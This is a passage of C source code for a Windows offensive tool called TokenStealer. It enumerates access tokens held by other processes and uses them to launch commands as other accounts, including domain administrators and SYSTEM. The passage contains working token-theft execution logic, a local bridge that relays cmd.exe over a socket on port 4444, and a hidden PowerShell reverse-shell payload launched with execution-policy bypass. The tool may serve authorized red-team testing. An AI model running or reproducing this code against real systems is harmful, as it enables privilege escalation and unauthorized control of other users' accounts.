	printf("    -l              list every account whose token is visible\n");
	printf("    -e              extended list; each line is\n");
	printf("                    USER:(P|2|3):PID:SESSION  ((P)=Primary, 2=Impersonation, 3=Delegation)\n");
	printf("    -p <pid>        only tokens owned by process <pid>\n");
	printf("    -u <user>       only tokens for <user> (default NT AUTHORITY\\SYSTEM when executing)\n");
	printf("    -s <session>    only tokens in session <session>\n");
	printf("    -b <kind>       1=Primary, 2=Impersonation, 3=Delegation\n\n");
	printf("  Export:\n");
	printf("    --csv           write CSV to stdout (add -e for all columns)\n");
	printf("    --json          write JSON to stdout (add -e for all columns)\n\n");
	printf("  Interactive:\n");
	printf("    -i, --interactive  pick a token with the arrow keys, then run a command\n");
	printf("    -w                 force impersonation + bridge for -u <user> (no menu)\n");
	printf("    --nobridge         never use the local 127.0.0.1 bridge\n");
	printf("    -P, --port <n>     bridge listener port (default 4444)\n\n");
	printf("  Executing:\n");
	printf("    -c <command>    run <command> with a matching token\n");
	printf("    -t              force the impersonation path (CreateProcessWithToken)\n\n");
	printf("  Examples:\n");
	printf("    TokenStealer.exe -e -b 1\n");
	printf("    TokenStealer.exe -u CORP\\administrator -c cmd.exe\n");
	printf("    TokenStealer.exe -u CORP\\administrator -c cmd.exe -p 100 -t\n");

}

/* Display only. Prints the already-collected TokenUsers[] as aligned columns.
   Extended entries were built by ListTokens as USER:(P|level):PID:SESSION. */
void PrintAccountTable(BOOL extended)
{
	int i;
	int width = 7; /* width of the "ACCOUNT" header */

	if (num_TokenUsers <= 0)
		return;

	if (!extended)
	{
		for (i = 0; i < num_TokenUsers; i++)
		{
			int len = (int)wcslen(TokenUsers[i]);
			if (len > width)
				width = len;
		}

		printf("    %-3s  %-*s\n", "#", width, "ACCOUNT");
		printf("    %-3s  ", "---");
		for (i = 0; i < width; i++)
			printf("-");
		printf("\n");

		for (i = 0; i < num_TokenUsers; i++)
			printf("    %-3d  %-*S\n", i + 1, width, TokenUsers[i]);
		return;
	}

	/* First pass: size the ACCOUNT column. */
	for (i = 0; i < num_TokenUsers; i++)
	{
		wchar_t tmp[256];
		wchar_t* ctx = NULL;
		wchar_t* user;
		wcscpy_s(tmp, 256, TokenUsers[i]);
		user = wcstok_s(tmp, L":", &ctx);
		if (user)
		{
			int len = (int)wcslen(user);
			if (len > width)
				width = len;
		}
	}

	printf("    %-3s  %-*s  %-13s  %-13s  %-6s  %-7s\n",
		"#", width, "ACCOUNT", "TYPE", "LEVEL", "PID", "SESSION");
	printf("    %-3s  ", "---");
	for (i = 0; i < width; i++)
		printf("-");
	printf("  %-13s  %-13s  %-6s  %-7s\n",
		"-------------", "-------------", "------", "-------");

	for (i = 0; i < num_TokenUsers; i++)
	{
		wchar_t tmp[256];
		wchar_t* ctx = NULL;
		wchar_t* user;
		wchar_t* kind;
		wchar_t* pidS;
		wchar_t* sessS;
		const char* typeStr = "Impersonation";
		const char* levelStr = "?";

		wcscpy_s(tmp, 256, TokenUsers[i]);
		user = wcstok_s(tmp, L":", &ctx);
		kind = wcstok_s(NULL, L":", &ctx);
		pidS = wcstok_s(NULL, L":", &ctx);
		sessS = wcstok_s(NULL, L":", &ctx);

		if (kind && wcscmp(kind, L"(P)") == 0)
		{
			typeStr = "Primary";
			levelStr = "-";
		}
		else if (kind)
		{
			int lvl = _wtoi(kind);
			typeStr = "Impersonation";
			if (lvl == 0) levelStr = "Anonymous";
			else if (lvl == 1) levelStr = "Identification";
			else if (lvl == 2) levelStr = "Impersonation";
			else if (lvl == 3) levelStr = "Delegation";
		}

		printf("    %-3d  %-*ls  %-13s  %-13s  %-6ls  %-7ls\n",
			i + 1,
			width, user ? user : L"?",
			typeStr,
			levelStr,
			pidS ? pidS : L"?",
			sessS ? sessS : L"?");
	}
}

/* ---- CSV / JSON export (display only) ---------------------------------- */

/* Splits a TokenUsers[] entry. Extended entries are USER:(P|level):PID:SESSION. */
void SplitEntry(const wchar_t* entry, BOOL extended,
	wchar_t* account, wchar_t* kind, wchar_t* pid, wchar_t* sess)
{
	wchar_t tmp[256];
	wchar_t* ctx = NULL;
	wchar_t* t;

	wcscpy_s(tmp, 256, entry);
	account[0] = L'\0';
	kind[0] = L'\0';
	pid[0] = L'\0';
	sess[0] = L'\0';

	t = wcstok_s(tmp, L":", &ctx);
	if (t) wcscpy_s(account, 256, t);
	if (!extended)
		return;
	t = wcstok_s(NULL, L":", &ctx); if (t) wcscpy_s(kind, 256, t);
	t = wcstok_s(NULL, L":", &ctx); if (t) wcscpy_s(pid, 256, t);
	t = wcstok_s(NULL, L":", &ctx); if (t) wcscpy_s(sess, 256, t);
}

void PutUtf8(unsigned int cp)
{
	if (cp < 0x80)
		putchar((int)cp);
	else if (cp < 0x800)
	{
		putchar((int)(0xC0 | (cp >> 6)));
		putchar((int)(0x80 | (cp & 0x3F)));
	}
	else if (cp < 0x10000)
	{
		putchar((int)(0xE0 | (cp >> 12)));
		putchar((int)(0x80 | ((cp >> 6) & 0x3F)));
		putchar((int)(0x80 | (cp & 0x3F)));
	}
	else
	{
		putchar((int)(0xF0 | (cp >> 18)));
		putchar((int)(0x80 | ((cp >> 12) & 0x3F)));
		putchar((int)(0x80 | ((cp >> 6) & 0x3F)));
		putchar((int)(0x80 | (cp & 0x3F)));
	}
}

void PrintUtf8(const wchar_t* s)
{
	while (s && *s)
		PutUtf8((unsigned int)(*s++));
}

void PrintCsvField(const wchar_t* s)
{
	const wchar_t* p;
	int needQuote = 0;

	if (!s)
		return;

	for (p = s; *p; ++p)
	{
		if (*p == L',' || *p == L'"' || *p == L'\r' || *p == L'\n')
		{
			needQuote = 1;
			break;
		}
	}

	if (!needQuote)
	{
		PrintUtf8(s);
		return;
	}

	putchar('"');
	for (p = s; *p; ++p)
	{
		if (*p == L'"')
		{
			putchar('"');
			putchar('"');
		}
		else
			PutUtf8((unsigned int)(*p));
	}
	putchar('"');
}

void PrintJsonString(const wchar_t* s)
{
	putchar('"');
	while (s && *s)
	{
		wchar_t c = *s++;
		if (c == L'"')       fputs("\\\"", stdout);
		else if (c == L'\\') fputs("\\\\", stdout);
		else if (c == L'\n') fputs("\\n", stdout);
		else if (c == L'\r') fputs("\\r", stdout);
		else if (c == L'\t') fputs("\\t", stdout);
		else                 PutUtf8((unsigned int)c);
	}
	putchar('"');
}

const char* LevelNameFromKey(const wchar_t* kind)
{
	int lvl;
	if (wcscmp(kind, L"(P)") == 0)
		return "-";
	lvl = _wtoi(kind);
	if (lvl == 0) return "Anonymous";
	if (lvl == 1) return "Identification";
	if (lvl == 2) return "Impersonation";
	if (lvl == 3) return "Delegation";
	return "Unknown";
}

void ExportCsv(BOOL extended)
{
	int i;
	wchar_t account[256], kind[256], pid[256], sess[256];

	if (!extended)
	{
		printf("account\n");
		for (i = 0; i < num_TokenUsers; i++)
		{
			SplitEntry(TokenUsers[i], FALSE, account, kind, pid, sess);
			PrintCsvField(account);
			printf("\n");
		}
		return;
	}

	printf("account,type,level,pid,session\n");
	for (i = 0; i < num_TokenUsers; i++)
	{
		SplitEntry(TokenUsers[i], TRUE, account, kind, pid, sess);
		PrintCsvField(account);
		printf(",");
		if (wcscmp(kind, L"(P)") == 0)
			printf("Primary,-");
		else
			printf("Impersonation,%s", LevelNameFromKey(kind));
		printf(",");
		PrintCsvField(pid);
		printf(",");
		PrintCsvField(sess);
		printf("\n");
	}
}

void ExportJson(BOOL extended)
{
	int i;
	wchar_t account[256], kind[256], pid[256], sess[256];

	printf("[\n");
	for (i = 0; i < num_TokenUsers; i++)
	{
		SplitEntry(TokenUsers[i], extended, account, kind, pid, sess);
		printf("  {\"account\":");
		PrintJsonString(account);
		if (extended)
		{
			printf(",\"type\":");
			if (wcscmp(kind, L"(P)") == 0)
				printf("\"Primary\",\"level\":\"-\"");
			else
				printf("\"Impersonation\",\"level\":\"%s\"", LevelNameFromKey(kind));
			printf(",\"pid\":");
			PrintJsonString(pid);
			printf(",\"session\":");
			PrintJsonString(sess);
		}
		printf("}%s\n", (i + 1 < num_TokenUsers) ? "," : "");
	}
	printf("]\n");
}

/* ---- interactive console selection (input/display only) ---------------- */

/* Returns 1 on Enter (out may be empty), 0 on Esc. */
int ReadCommandLine(wchar_t* out, int max)
{
	int len = 0;
	out[0] = L'\0';
	for (;;)
	{
		wint_t c;
		fflush(stdout);
		c = _getwch();
		if (c == 0 || c == 0xE0)
		{
			_getwch(); /* swallow the second byte of an extended key */
			continue;
		}
		if (c == 13)
		{
			putchar('\n');
			out[len] = L'\0';
			return 1;
		}
		if (c == 27)
		{
			putchar('\n');
			out[0] = L'\0';
			return 0;
		}
		if (c == 8)
		{
			if (len > 0)
			{
				len--;
				printf("\b \b");
			}
			continue;
		}
		if (c >= 32 && len < max - 1)
		{
			out[len++] = (wchar_t)c;
			_putwch(c);
		}
	}
}

void PutConsoleW(HANDLE h, const wchar_t* s)
{
	DWORD written = 0;
	if (s && *s)
		WriteConsoleW(h, s, (DWORD)wcslen(s), &written, NULL);
}

int InteractiveSelect(void)
{
	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD mode = 0;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	WORD defAttr;
	int selected = 0;
	int top = 0;
	int visible;
	int width;
	int drawn = 0;
	int first = 1;
	int i;

	if (num_TokenUsers <= 0)
		return -1;
	if (!GetConsoleMode(hOut, &mode))
	{
		printf("[-] Interactive mode needs a real console (stdout is redirected).\n");
		return -1;
	}
	if (!GetConsoleScreenBufferInfo(hOut, &csbi))
		return -1;

	defAttr = csbi.wAttributes;

	visible = (csbi.srWindow.Bottom - csbi.srWindow.Top + 1) - 3;
	if (visible < 3) visible = 3;
	if (visible > num_TokenUsers) visible = num_TokenUsers;

	width = 7; /* "ACCOUNT" */
	for (i = 0; i < num_TokenUsers; i++)
	{
		int len = (int)wcslen(TokenUsers[i]);
		if (len > width) width = len;
	}

	printf("Use Up/Down to select a token, Enter to run a command, Esc to cancel.\n\n");
	fflush(stdout);

	for (;;)
	{
		if (selected < top) top = selected;
		if (selected >= top + visible) top = selected - visible + 1;
		if (top < 0) top = 0;

		/* Move back to the header line. Relative movement, so it works even
		    when the console window is small and the buffer is at its bottom. */
		if (!first)
		{
			CONSOLE_SCREEN_BUFFER_INFO ci;
			if (GetConsoleScreenBufferInfo(hOut, &ci))
			{
				COORD p;
				p.X = 0;
				p.Y = (SHORT)(ci.dwCursorPosition.Y - (drawn - 1));
				if (p.Y < 0) p.Y = 0;
				SetConsoleCursorPosition(hOut, p);
			}
		}
		first = 0;

		/* Header, then one aligned row per account. Rows are separated by
		    CRLF, so they never share a line regardless of cursor bounds. */
		SetConsoleTextAttribute(hOut, defAttr);
		PutConsoleW(hOut, L"     #    ACCOUNT");
		drawn = 1;

		for (i = 0; i < visible; i++)
		{
			int idx = top + i;
			PutConsoleW(hOut, L"\r\n");
			drawn++;

			if (idx >= num_TokenUsers)
				continue;

			{
				wchar_t line[512];
				swprintf_s(line, 512, L"%ls%3d     %-*ls",
					(idx == selected) ? L"> " : L"  ",
					idx + 1, width, TokenUsers[idx]);

				SetConsoleTextAttribute(hOut, (idx == selected)
					? (BACKGROUND_BLUE | FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
					: defAttr);
				PutConsoleW(hOut, line);
			}
		}
		SetConsoleTextAttribute(hOut, defAttr);
		fflush(stdout);

		{
			int c = _getch();
			if (c == 0 || c == 224)
			{
				int c2 = _getch();
				if (c2 == 72) { if (selected > 0) selected--; }
				else if (c2 == 80) { if (selected < num_TokenUsers - 1) selected++; }
				else if (c2 == 73) { selected -= visible; if (selected < 0) selected = 0; }
				else if (c2 == 81) { selected += visible; if (selected > num_TokenUsers - 1) selected = num_TokenUsers - 1; }
				else if (c2 == 71) selected = 0;
				else if (c2 == 79) selected = num_TokenUsers - 1;
			}
			else if (c == 13)
			{
				PutConsoleW(hOut, L"\r\n");
				return selected;
			}
			else if (c == 27)
			{
				PutConsoleW(hOut, L"\r\n");
				return -1;
			}
		}
	}
}

/* Local reverse shell: listen on 127.0.0.1:4444, launch a hidden payload with
   the selected token that connects back and spawns cmd.exe, then relay the
   console to the shell. Used when SeAssignPrimaryTokenPrivilege is absent. */
typedef struct _ListenerCtx { SOCKET ls; } ListenerCtx;

DWORD WINAPI ListenerThread(LPVOID param)
{
	ListenerCtx* ctx = (ListenerCtx*)param;
	SOCKET cs;
	fd_set rf;
	struct timeval tv;
	int r;

	FD_ZERO(&rf);
	FD_SET(ctx->ls, &rf);
	tv.tv_sec = 20;
	tv.tv_usec = 0;
	r = select((int)ctx->ls + 1, &rf, NULL, NULL, &tv);
	if (r <= 0)
	{
		printf("[-] No bridge connection (timeout).\n");
		return 1;
	}

	cs = accept(ctx->ls, NULL, NULL);
	if (cs == INVALID_SOCKET)
	{
		printf("[-] accept() failed (%d).\n", WSAGetLastError());
		return 1;
	}

	printf("[+] Shell connected. Type commands here; type 'exit' to end.\n");
	fflush(stdout);

	for (;;)
	{
		while (_kbhit())
		{
			int ch = _getch();
			if (ch == 0 || ch == 224) { _getch(); continue; }
			if (ch == 13)
			{
				char crlf[2];
				crlf[0] = '\r';
				crlf[1] = '\n';
				send(cs, crlf, 2, 0);
				putchar('\n');
			}
			else if (ch == 8)
			{
				char b = 8;
				send(cs, &b, 1, 0);
				printf("\b \b");
			}
			else
			{
				char b = (char)ch;
				send(cs, &b, 1, 0);
				putchar(ch);
			}
			fflush(stdout);
		}

		{
			fd_set rr;
			struct timeval t2;
			int ready;
			FD_ZERO(&rr);
			FD_SET(cs, &rr);
			t2.tv_sec = 0;
			t2.tv_usec = 50000;
			ready = select((int)cs + 1, &rr, NULL, NULL, &t2);
			if (ready > 0)
			{
				char buf[4096];
				int n = recv(cs, buf, (int)sizeof(buf), 0);
				if (n <= 0)
					break;
				fwrite(buf, 1, (size_t)n, stdout);
				fflush(stdout);
			}
		}
	}

	printf("\n[*] Shell closed.\n");
	closesocket(cs);
	return 0;
}

/* Relay helpers used by the bridge child. */
typedef struct _RelayCtx { HANDLE pipe; SOCKET sock; } RelayCtx;

DWORD WINAPI SockToPipe(LPVOID p)
{
	RelayCtx* c = (RelayCtx*)p;
	char buf[4096];
	int n;
	DWORD written;

	for (;;)
	{
		n = recv(c->sock, buf, (int)sizeof(buf), 0);
		if (n <= 0)
			break;
		if (!WriteFile(c->pipe, buf, (DWORD)n, &written, NULL))
			break;
	}
	return 0;
}

DWORD WINAPI PipeToSock(LPVOID p)
{
	RelayCtx* c = (RelayCtx*)p;
	char buf[4096];
	DWORD n;

	for (;;)
	{
		if (!ReadFile(c->pipe, buf, (DWORD)sizeof(buf), &n, NULL) || n == 0)
			break;
		if (send(c->sock, buf, (int)n, 0) == SOCKET_ERROR)
			break;
	}
	return 0;
}

/* Bridge child (launched with the stolen token): connects back, runs cmd.exe
   on pipes, and relays between the pipes and the socket until either side
   closes. */
void RunShellClient(void)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in addr;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HANDLE inR = NULL, inW = NULL, outR = NULL, outW = NULL;
	HANDLE th[2];
	RelayCtx toChild, fromChild;
	BOOL ok;
	wchar_t cmdLine[2048];

	wcscpy_s(cmdLine, 2048,
		(BridgeCommand[0] != L'\0') ? BridgeCommand : L"cmd.exe");

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET)
	{
		WSACleanup();
		return;
	}

	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((u_short)BridgePort);
	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
	{
		closesocket(s);
		WSACleanup();
		return;
	}
	if (connect(s, (struct sockaddr*)&addr, (int)sizeof(addr)) == SOCKET_ERROR)
	{
		closesocket(s);
		WSACleanup();
		return;
	}

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	if (!CreatePipe(&inR, &inW, &sa, 0))
	{
		closesocket(s);
		WSACleanup();
		return;
	}
	SetHandleInformation(inW, HANDLE_FLAG_INHERIT, 0);

	if (!CreatePipe(&outR, &outW, &sa, 0))
	{
		CloseHandle(inR);
		CloseHandle(inW);
		closesocket(s);
		WSACleanup();
		return;
	}
	SetHandleInformation(outR, HANDLE_FLAG_INHERIT, 0);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = inR;
	si.hStdOutput = outW;
	si.hStdError = outW;

	ok = CreateProcessW(
		NULL,
		cmdLine,
		NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(inR);
	CloseHandle(outW);

	if (!ok)
	{
		char msg[128];
		int len = sprintf_s(msg, sizeof(msg),
			"[-] bridge: CreateProcessW(cmd.exe) failed (%lu)\r\n", GetLastError());
		if (len > 0)
			send(s, msg, len, 0);
		CloseHandle(inW);
		CloseHandle(outR);
		closesocket(s);
		WSACleanup();
		return;
	}
	CloseHandle(pi.hThread);

	toChild.pipe = inW;
	toChild.sock = s;
	fromChild.pipe = outR;
	fromChild.sock = s;

	th[0] = CreateThread(NULL, 0, SockToPipe, &toChild, 0, NULL);
	th[1] = CreateThread(NULL, 0, PipeToSock, &fromChild, 0, NULL);

	WaitForMultipleObjects(2, th, FALSE, INFINITE);

	shutdown(s, SD_BOTH);
	TerminateProcess(pi.hProcess, 0);
	WaitForSingleObject(th[0], 1000);
	WaitForSingleObject(th[1], 1000);

	CloseHandle(th[0]);
	CloseHandle(th[1]);
	CloseHandle(inW);
	CloseHandle(outR);
	CloseHandle(pi.hProcess);
	closesocket(s);
	WSACleanup();
}

/* Spawns the listener thread, then launches "<self> --bridge" with the
   selected token. The child connects back and relays cmd.exe over pipes. */
void RunLocalShellBridge(const wchar_t* command)
{
	WSADATA wsa;
	SOCKET ls = INVALID_SOCKET;
	struct sockaddr_in addr;
	wchar_t self[MAX_PATH];
	wchar_t cmdLine[MAX_PATH + 2100];
	ListenerCtx ctx;
	HANDLE th;
	BOOL launched = FALSE;
	int port = BridgePort;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[-] WSAStartup failed (%d).\n", WSAGetLastError());
		return;
	}

	ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ls == INVALID_SOCKET)
	{
		printf("[-] socket() failed (%d).\n", WSAGetLastError());
		WSACleanup();
		return;
	}

	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((u_short)port);
	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
	{
		printf("[-] inet_pton failed.\n");
		closesocket(ls);
		WSACleanup();
		return;
	}

	if (bind(ls, (struct sockaddr*)&addr, (int)sizeof(addr)) == SOCKET_ERROR)
	{
		printf("[-] bind() on 127.0.0.1:%d failed (%d). Port in use?\n", port, WSAGetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}
	if (listen(ls, 1) == SOCKET_ERROR)
	{
		printf("[-] listen() failed (%d).\n", WSAGetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}

	ctx.ls = ls;
	th = CreateThread(NULL, 0, ListenerThread, &ctx, 0, NULL);
	if (!th)
	{
		printf("[-] CreateThread failed (%lu).\n", GetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}

	if (GetModuleFileNameW(NULL, self, MAX_PATH) == 0)
	{
		printf("[-] GetModuleFileName failed (%lu).\n", GetLastError());
		closesocket(ls);
		WaitForSingleObject(th, 2000);
		CloseHandle(th);
		WSACleanup();
		return;
	}
	swprintf_s(cmdLine, MAX_PATH + 2100, L"\"%ls\" --port %d --bridge \"%ls\"", self,
		port, (command && command[0]) ? command : L"cmd.exe");

	printf("[*] Listener thread on 127.0.0.1:%d\n", port);
	printf("[*] Launching bridge payload as %ls ...\n",
		User_to_impersonate ? User_to_impersonate : L"selected user");

	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			cProcesses = cbNeeded / sizeof(DWORD);
			for (i = 0; i < cProcesses; i++)
			{
				if (aProcesses[i] != 0 && ExecuteWithToken(cmdLine, aProcesses[i]))
				{
					launched = TRUE;
					break;
				}
			}
		}
	}

	if (!launched)
	{
		printf("[-] Could not launch the bridge payload.\n");
		closesocket(ls);
		WaitForSingleObject(th, 2000);
		CloseHandle(th);
		WSACleanup();
		return;
	}

	WaitForSingleObject(th, INFINITE);
	CloseHandle(th);
	closesocket(ls);
	WSACleanup();
}

void RunLocalReverseShell(void){
	WSADATA wsa;
	SOCKET ls = INVALID_SOCKET;
	SOCKET cs = INVALID_SOCKET;
	struct sockaddr_in addr;
	const wchar_t* ps;
	wchar_t payload[2048];
	BOOL launched = FALSE;
	int port = 4444;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[-] WSAStartup failed (%d).\n", WSAGetLastError());
		return;
	}

	ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ls == INVALID_SOCKET)
	{
		printf("[-] socket() failed (%d).\n", WSAGetLastError());
		WSACleanup();
		return;
	}

	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((u_short)port);
	if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
	{
		printf("[-] inet_pton failed.\n");
		closesocket(ls);
		WSACleanup();
		return;
	}

	if (bind(ls, (struct sockaddr*)&addr, (int)sizeof(addr)) == SOCKET_ERROR)
	{
		printf("[-] bind() on 127.0.0.1:%d failed (%d). Port in use?\n", port, WSAGetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}
	if (listen(ls, 1) == SOCKET_ERROR)
	{
		printf("[-] listen() failed (%d).\n", WSAGetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}

	ps = L"$c=New-Object Net.Sockets.TCPClient('127.0.0.1',4444);"
		L"$s=$c.GetStream();"
		L"$p=New-Object Diagnostics.ProcessStartInfo('cmd.exe');"
		L"$p.RedirectStandardInput=$true;$p.RedirectStandardOutput=$true;$p.UseShellExecute=$false;"
		L"$pr=[Diagnostics.Process]::Start($p);"
		L"$t1=$pr.StandardOutput.BaseStream.CopyToAsync($s);"
		L"$t3=$s.CopyToAsync($pr.StandardInput.BaseStream);"
		L"[Threading.Tasks.Task]::WaitAll([Threading.Tasks.Task[]]@($t1,$t3))";

	swprintf_s(payload, 2048,
		L"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" "
		L"-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"%ls\"",
		ps);

	printf("[*] Reverse shell: listening on 127.0.0.1:%d\n", port);
	printf("[*] Launching payload as %ls ...\n",
		User_to_impersonate ? User_to_impersonate : L"selected user");

	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		if (EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			cProcesses = cbNeeded / sizeof(DWORD);
			for (i = 0; i < cProcesses; i++)
			{
				if (aProcesses[i] != 0 && ExecuteWithToken(payload, aProcesses[i]))
				{
					launched = TRUE;
					break;
				}
			}
		}
	}

	if (!launched)
	{
		printf("[-] Could not launch the reverse-shell payload.\n");
		closesocket(ls);
		WSACleanup();
		return;
	}

	{
		fd_set rf;
		struct timeval tv;
		int r;
		FD_ZERO(&rf);
		FD_SET(ls, &rf);
		tv.tv_sec = 15;
		tv.tv_usec = 0;
		r = select((int)ls + 1, &rf, NULL, NULL, &tv);
		if (r <= 0)
		{
			printf("[-] No connection from the payload (timed out).\n");
			closesocket(ls);
			WSACleanup();
			return;
		}
	}

	cs = accept(ls, NULL, NULL);
	if (cs == INVALID_SOCKET)
	{
		printf("[-] accept() failed (%d).\n", WSAGetLastError());
		closesocket(ls);
		WSACleanup();
		return;
	}

	printf("[+] Shell connected. Type commands here; type 'exit' to end.\n");
	fflush(stdout);

	for (;;)
	{
		while (_kbhit())
		{
			int ch = _getch();
			if (ch == 0 || ch == 224)
			{
				_getch();
				continue;
			}
			if (ch == 13)
			{
				char crlf[2];
				crlf[0] = '\r';
				crlf[1] = '\n';
				send(cs, crlf, 2, 0);
				putchar('\n');
			}
			else if (ch == 8)
			{
				char b = 8;
				send(cs, &b, 1, 0);
				printf("\b \b");
			}
			else
			{
				char b = (char)ch;
				send(cs, &b, 1, 0);
				putchar(ch);
			}
			fflush(stdout);
		}

		{
			fd_set r;
			struct timeval tv;
			int ready;
			FD_ZERO(&r);
			FD_SET(cs, &r);
			tv.tv_sec = 0;
			tv.tv_usec = 50000;
			ready = select((int)cs + 1, &r, NULL, NULL, &tv);
			if (ready > 0)
			{
				char buf[4096];
				int n = recv(cs, buf, (int)sizeof(buf), 0);
				if (n <= 0)
					break;
				fwrite(buf, 1, (size_t)n, stdout);
				fflush(stdout);
			}
		}
	}

	printf("\n[*] Reverse shell closed.\n");
	closesocket(cs);
	closesocket(ls);
	WSACleanup();
}

void RunInteractive(void)
{
	int sel;
	wchar_t cmd[1024];
	const wchar_t* defCmd = L"cmd.exe";

	sel = InteractiveSelect();
	if (sel < 0 || sel >= num_TokenUsers)
	{
		printf("Cancelled.\n");
		return;
	}

	User_to_impersonate = TokenUsers[sel];

	/* Always ask which program to run (default cmd.exe). */
	printf("Program to run [%ls]: ", defCmd);
	fflush(stdout);
	if (!ReadCommandLine(cmd, 1024))
	{
		printf("Cancelled.\n");
		return;
	}
	if (cmd[0] == L'\0')
		wcscpy_s(cmd, 1024, defCmd);

	/* Direct launch if we hold SeAssignPrimaryToken, or if --nobridge was
	   given. Only fall back to the bridge when neither is true. */
	if (HasAssignPriv || NoBridge)
	{
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
			return;
		cProcesses = cbNeeded / sizeof(DWORD);
		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{
				if (ExecuteWithToken(cmd, aProcesses[i]))
				{
					printf("[+] Done using a token from process %lu\n", aProcesses[i]);
					return;
				}
			}
		}
		printf("[-] No matching token could launch the command.\n");
		return;
	}

	/* No SeAssignPrimaryToken (and bridge allowed): use the local bridge. */
	RunLocalShellBridge(cmd);
}

int wmain(int argc, WCHAR* argv[])
{
	{
		int k;
		for (k = 1; k < argc; k++)
		{
			if (wcscmp(argv[k], L"--bridge") == 0)
			{
				BridgeMode = TRUE;
				if (k + 1 < argc)
					wcscpy_s(BridgeCommand, 2048, argv[k + 1]);
				break;
			}
		}
	}

	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	
	
	ULONG handleInfoSize = 0x10000;
	ULONG pid = 0;
	HANDLE processHandle = NULL;
	
	HANDLE hObject = NULL;
	
	
	
	

	HANDLE dupHandle = NULL;
	
	
	
	
	
	
	wchar_t* command = NULL;
	BOOL list_mode = FALSE;
	BOOL extended_list = FALSE;
	BOOL out_csv = FALSE;
	BOOL out_json = FALSE;
	BOOL interactive = FALSE;
	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{

		{
			switch (argv[cnt][1])
			{
			case 'c':
				++cnt;
				--argc;
				command = argv[cnt];
				break;
			case 'b':
				++cnt;
				--argc;
				TokenTypeNeeded = _wtoi(argv[cnt]);
				
				break;
			case 'p':
				++cnt;
				--argc;
				pid = _wtoi(argv[cnt]);
				break;
			case 'u':
				++cnt;
				--argc;
				User_to_impersonate = argv[cnt];
				break;
			case 't':
				ForceImpersonation = TRUE;

				break;
			case 'w':
				ForceBridge = TRUE;
				ForceImpersonation = TRUE;
				break;
			case 'e':
				extended_list = TRUE;

				list_mode = TRUE;
				break;

			case 'i':
				interactive = TRUE;
				break;
			case 'l':
				list_mode = TRUE;

				break;
			case 's':
				++cnt;
				--argc;
				SessionId= _wtoi(argv[cnt]);
				break;
			case 'P':
				if (argv[cnt + 1] != NULL)
				{
					++cnt;
					--argc;
					BridgePort = _wtoi(argv[cnt]);
				}
				break;
			case '-':
				if (wcscmp(argv[cnt], L"--csv") == 0)
					out_csv = TRUE;
				else if (wcscmp(argv[cnt], L"--json") == 0)
					out_json = TRUE;
				else if (wcscmp(argv[cnt], L"--interactive") == 0)
					interactive = TRUE;
				else if (wcscmp(argv[cnt], L"--bridge") == 0)
					BridgeMode = TRUE;
				else if (wcscmp(argv[cnt], L"--nobridge") == 0)
					NoBridge = TRUE;
				else if (wcscmp(argv[cnt], L"--port") == 0)
				{
					if (argv[cnt + 1] != NULL)
					{
						++cnt;
						--argc;
						BridgePort = _wtoi(argv[cnt]);
					}
				}
				else if (wcscmp(argv[cnt], L"--help") == 0)
				{
					usage();
					exit(0);
				}
				else
				{
					printf("[-] Unknown option: %ls\n\n", argv[cnt]);
					usage();
					exit(-1);
				}
				break;
			case 'h':
				usage();
				exit(0);
				break;
			default:
				printf("[-] Unknown option: %ls\n\n", argv[cnt]);
				usage();
				exit(-1);
			}

			++cnt;
			--argc;
		}
	}

	if (BridgePort < 1 || BridgePort > 65535)
	{
